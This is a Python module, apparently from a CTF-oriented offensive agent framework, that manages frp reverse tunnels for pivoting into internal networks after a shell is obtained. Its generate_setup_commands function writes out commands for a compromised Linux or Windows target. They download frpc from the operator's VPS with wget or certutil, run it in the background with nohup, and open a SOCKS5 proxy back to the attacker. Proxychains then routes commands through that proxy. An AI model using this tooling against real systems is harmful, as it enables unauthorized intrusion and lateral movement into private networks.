# remote_executor/tunnel_manager.py
"""
隧道管理模块

功能:
- frp隧道管理
- SOCKS5代理配置
- 通过代理执行命令

基于实战经验:
- frps在VPS运行
- frpc在目标机器运行
- 配置SOCKS5代理访问内网
"""
import os
import re
import json
import time
import socket
import subprocess
import atexit
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from logger import get_logger

logger = get_logger("Tunnel")

# 全局变量：跟踪frps进程，确保退出时清理
_frps_process: Optional[subprocess.Popen] = None


def _cleanup_frps_on_exit():
    """程序退出时清理frps进程"""
    global _frps_process
    if _frps_process:
        try:
            _frps_process.terminate()
            _frps_process.wait(timeout=5)
        except Exception:
            try:
                _frps_process.kill()
            except Exception:
                pass
        _frps_process = None
        logger.info("[Tunnel] frps进程已清理")


# 注册退出清理函数
atexit.register(_cleanup_frps_on_exit)


@dataclass
class TunnelConfig:
    """隧道配置

    注意：框架运行在VPS上，frps在本地运行
    - frps: 本机运行，监听FRP_SERVER_PORT
    - frpc: 目标机器运行，连接回本机
    - SOCKS5代理: 本机的FRP_SOCKS5_PORT端口
    """
    local_ip: str  # 本机公网IP (frps监听地址)
    vps_port: int = 7000  # frps端口
    remote_port: int = 10800  # SOCKS5代理端口
    local_port: int = 1080  # 目标机器本地端口
    token: str = ""


@dataclass
class TunnelStatus:
    """隧道状态"""
    active: bool
    local_ip: str  # 本机公网IP (frps地址)
    remote_port: int  # SOCKS5端口
    socks5_address: str  # 完整代理地址
    created_at: float
    last_check: float


class TunnelManager:
    """
    隧道管理器

    管理 frp 代理隧道
    """

    # frp 配置模板 (frp 0.52.0+ 使用 TOML 格式)
    FRPS_CONFIG_TEMPLATE = """serverPort = "{vps_port}"
auth.token = "{token}"
"""

    FRPC_CONFIG_TEMPLATE = """serverAddr = "{local_ip}"
serverPort = {vps_port}
auth.token = "{token}"

[[proxies]]
name = "socks5"
type = "tcp"
remotePort = {remote_port}
localIP = "127.0.0.1"
localPort = {local_port}
"""

    def __init__(self):
        self.frp_dir = "/opt/frp"  # 镜像内置的frp目录
        self.active_tunnels: Dict[str, TunnelStatus] = {}
        self.tunnel_file = "data/tunnels.json"  # 持久化存储
        self._load_tunnels()

    def _load_tunnels(self):
        """加载隧道状态"""
        if os.path.exists(self.tunnel_file):
            try:
                with open(self.tunnel_file, 'r') as f:
                    data = json.load(f)
                    for tid, tdata in data.items():
                        self.active_tunnels[tid] = TunnelStatus(**tdata)
            except Exception:
                pass

    def _save_tunnels(self):
        """保存隧道状态"""
        os.makedirs(os.path.dirname(self.tunnel_file), exist_ok=True)
        try:
            with open(self.tunnel_file, 'w') as f:
                json.dump({
                    tid: {
                        "active": t.active,
                        "local_ip": t.local_ip,
                        "remote_port": t.remote_port,
                        "socks5_address": t.socks5_address,
                        "created_at": t.created_at,
                        "last_check": t.last_check
                    }
                    for tid, t in self.active_tunnels.items()
                }, f)
        except Exception:
            pass

    # ==================== 配置生成 ====================

    def generate_frps_config(self, config: TunnelConfig) -> str:
        """
        生成 frps 服务端配置

        用于在本机运行 (框架运行在同一台机器)
        """
        return self.FRPS_CONFIG_TEMPLATE.format(
            vps_port=config.vps_port,
            token=config.token or "ctf_agent_token"
        )

    def generate_frpc_config(self, config: TunnelConfig) -> str:
        """
        生成 frpc 客户端配置

        用于在目标机器上运行，连接回本机(frps)
        """
        return self.FRPC_CONFIG_TEMPLATE.format(
            local_ip=config.local_ip,
            vps_port=config.vps_port,
            remote_port=config.remote_port,
            local_port=config.local_port,
            token=config.token or "ctf_agent_token"
        )

    def generate_setup_commands(
        self,
        config: TunnelConfig,
        os_type: str = "linux",
        remote_dir: str = "/tmp"
    ) -> Dict[str, Any]:
        """
        生成完整的隧道搭建命令

        Args:
            config: 隧道配置
            os_type: 目标操作系统
            remote_dir: 远程目录

        Returns:
            搭建命令和说明
        """
        # 生成配置文件内容
        frpc_config = self.generate_frpc_config(config)

        result = {
            "config": config,
            "frpc_config": frpc_config,
            "socks5_address": f"{config.local_ip}:{config.remote_port}",
            "commands": [],
            "local_commands": []  # 本机执行的命令
        }

        if os_type.lower() == "linux":
            remote_path = f"{remote_dir}/frpc"
            config_path = f"{remote_dir}/frpc.ini"

            result["commands"] = [
                f"# 1. 下载frpc (从本机HTTP服务器)",
                f"# frpc位于/opt/frp/frpc，HTTP服务器根目录为/opt",
                f"wget -O {remote_path} http://{config.local_ip}:8000/frp/frpc",
                f"chmod +x {remote_path}",
                f"",
                f"# 2. 写入配置文件",
                f"cat > {config_path} << 'EOF'",
                frpc_config,
                "EOF",
                f"",
                f"# 3. 启动frpc",
                f"nohup {remote_path} -c {config_path} > /dev/null 2>&1 &",
                f"",
                f"# 4. 验证",
                f"ps aux | grep frpc"
            ]
        else:
            # Windows
            remote_path = f"C:\\temp\\frpc.exe"
            config_path = f"C:\\temp\\frpc.ini"

            result["commands"] = [
                f"# 1. 下载frpc (从本机HTTP服务器)",
                f"# frpc.exe位于/opt/tools/windows/frpc.exe",
                f"certutil -urlcache -split -f http://{config.local_ip}:8000/tools/windows/frpc.exe {remote_path}",
                f"",
                f"# 2. 写入配置文件 (PowerShell)",
                f"powershell -c \"[IO.File]::WriteAllText('{config_path}', '{frpc_config}')\"",
                f"",
                f"# 3. 启动frpc",
                f"{remote_path} -c {config_path}",
                f"",
                f"# 4. 验证",
                f"tasklist | findstr frpc"
            ]

        # 本机执行的命令 (frps已在本地运行)
        result["local_commands"] = [
            f"# 本机(frps)状态检查:",
            f"# 1. 检查frps是否运行",
            f"ps aux | grep frps",
            f"",
            f"# 2. 检查端口监听",
            f"netstat -tlnp | grep {config.vps_port}",
            f"netstat -tlnp | grep {config.remote_port}",
            f"",
            f"# 3. 如需启动frps:",
            f"cd /opt/frp && ./frps -c frps.ini &"
        ]

        return result

    # ==================== 隧道管理 ====================

    def create_tunnel(
        self,
        local_ip: str,
        vps_port: int = 7000,
        remote_port: int = 10800
    ) -> str:
        """
        创建隧道记录

        Args:
            local_ip: 本机公网IP (frps监听地址)
            vps_port: frps端口
            remote_port: SOCKS5代理端口

        Returns:
            隧道ID
        """
        import uuid
        tunnel_id = str(uuid.uuid4())[:8]

        self.active_tunnels[tunnel_id] = TunnelStatus(
            active=True,
            local_ip=local_ip,
            remote_port=remote_port,
            socks5_address=f"{local_ip}:{remote_port}",
            created_at=time.time(),
            last_check=time.time()
        )

        self._save_tunnels()
        logger.info(f"创建隧道: {tunnel_id} -> {local_ip}:{remote_port}")
        return tunnel_id

    def check_tunnel(self, tunnel_id: str) -> bool:
        """检查隧道是否可用 (连接本机SOCKS5端口)"""
        if tunnel_id not in self.active_tunnels:
            return False

        tunnel = self.active_tunnels[tunnel_id]

        # 尝试连接本机SOCKS5端口
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            # SOCKS5端口在本机监听
            result = sock.connect_ex(("127.0.0.1", tunnel.remote_port))
            sock.close()

            tunnel.active = (result == 0)
            tunnel.last_check = time.time()
            self._save_tunnels()

            return tunnel.active
        except Exception:
            tunnel.active = False
            return False

    def get_socks5_proxy(self, tunnel_id: str) -> Optional[str]:
        """获取SOCKS5代理地址"""
        if tunnel_id in self.active_tunnels:
            tunnel = self.active_tunnels[tunnel_id]
            if tunnel.active:
                return tunnel.socks5_address
        return None

    def list_tunnels(self) -> List[TunnelStatus]:
        """列出所有隧道"""
        return list(self.active_tunnels.values())

    def remove_tunnel(self, tunnel_id: str):
        """移除隧道"""
        if tunnel_id in self.active_tunnels:
            del self.active_tunnels[tunnel_id]
            self._save_tunnels()

    # ==================== proxychains 配置 ====================

    def setup_proxychains(self, socks5_port: int) -> bool:
        """
        配置 proxychains

        Args:
            socks5_port: SOCKS5代理端口 (本机监听)

        Returns:
            是否成功
        """
        try:
            # 生成配置 (SOCKS5在本机监听)
            config = f"""
# proxychains.conf generated by CTF-Agent
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 {socks5_port}
"""

            # 写入配置文件
            config_path = "/etc/proxychains4.conf"
            with open(config_path, 'w') as f:
                f.write(config)

            logger.info(f"配置proxychains: socks5 127.0.0.1 {socks5_port}")
            return True

        except Exception as e:
            logger.warning(f"配置proxychains失败: {e}")
            return False

    def execute_via_tunnel(self, tunnel_id: str, command: str, timeout: int = 60) -> Dict:
        """
        通过隧道执行命令

        使用 proxychains 通过本机SOCKS5代理执行
        """
        if tunnel_id not in self.active_tunnels:
            return {"success": False, "error": "隧道不存在"}

        tunnel = self.active_tunnels[tunnel_id]
        if not tunnel.active:
            return {"success": False, "error": "隧道不可用"}

        # 配置 proxychains (连接本机SOCKS5端口)
        self.setup_proxychains(tunnel.remote_port)

        # 执行命令
        try:
            cmd = ["proxychains4", "-q"] + command.split()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            return {
                "success": result.returncode == 0,
                "output": result.stdout,
                "error": result.stderr,
                "command": command,
                "via_proxy": f"127.0.0.1:{tunnel.remote_port}"
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "执行超时"}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ==================== 便捷函数 ====================

def quick_setup_tunnel(local_ip: str, remote_port: int = 10800) -> Dict:
    """
    快速生成隧道搭建命令

    Args:
        local_ip: 本机公网IP (框架运行的VPS的IP)
        remote_port: SOCKS5代理端口

    用于在获取shell后快速搭建隧道
    """
    manager = TunnelManager()
    config = TunnelConfig(
        local_ip=local_ip,
        remote_port=remote_port
    )

    return {
        "linux": manager.generate_setup_commands(config, "linux"),
        "windows": manager.generate_setup_commands(config, "windows"),
        "socks5_address": f"{local_ip}:{remote_port}",
        "proxychains_command": f"socks5 127.0.0.1 {remote_port}"  # 本机连接本地端口
    }


def start_local_frps(port: int = 7000, frp_dir: str = "/opt/frp") -> Optional[subprocess.Popen]:
    """
    启动本地frps服务

    框架运行在VPS上，frps在本地启动监听

    Args:
        port: frps监听端口
        frp_dir: frp目录 (默认使用镜像内置目录)

    Returns:
        frps进程对象
    """
    global _frps_process

    frps_path = os.path.join(frp_dir, "frps")
    config_path = os.path.join(frp_dir, "frps.ini")

    # 检查frps是否存在
    if not os.path.exists(frps_path):
        logger.warning(f"frps不存在: {frps_path}")
        logger.info("[TunnelManager] 请先下载frp: https://github.com/fatedier/frp/releases")
        return None

    # 生成默认配置 (frp 0.52.0+ TOML格式)
    if not os.path.exists(config_path):
        config = f"""serverPort = {port}
auth.token = "ctf_agent_token"
"""
        with open(config_path, 'w') as f:
            f.write(config)
        logger.info(f"生成frps配置: {config_path}")

    # 启动frps
    try:
        process = subprocess.Popen(
            [frps_path, "-c", config_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        _frps_process = process  # 保存到全局变量，确保退出时清理
        logger.info(f"frps启动成功: 端口 {port}")
        logger.info(f"PID: {process.pid}")
        return process

    except Exception as e:
        logger.warning(f"frps启动失败: {e}")
        return None


def check_frps_status(port: int = 7000) -> bool:
    """
    检查frps是否运行

    Args:
        port: frps端口

    Returns:
        是否运行中
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex(("127.0.0.1", port))
        sock.close()
        return result == 0
    except Exception:
        return False


def stop_local_frps() -> Dict:
    """
    停止本地frps服务

    Returns:
        停止结果
    """
    global _frps_process

    if _frps_process:
        try:
            _frps_process.terminate()
            _frps_process.wait(timeout=5)
            logger.info("[Tunnel] frps进程已终止")
        except subprocess.TimeoutExpired:
            _frps_process.kill()
            logger.info("[Tunnel] frps进程已强制终止")
        except Exception as e:
            logger.warning(f"[Tunnel] frps终止失败: {e}")
        _frps_process = None
        return {"success": True, "message": "frps已停止"}

    return {"success": True, "message": "frps未运行"}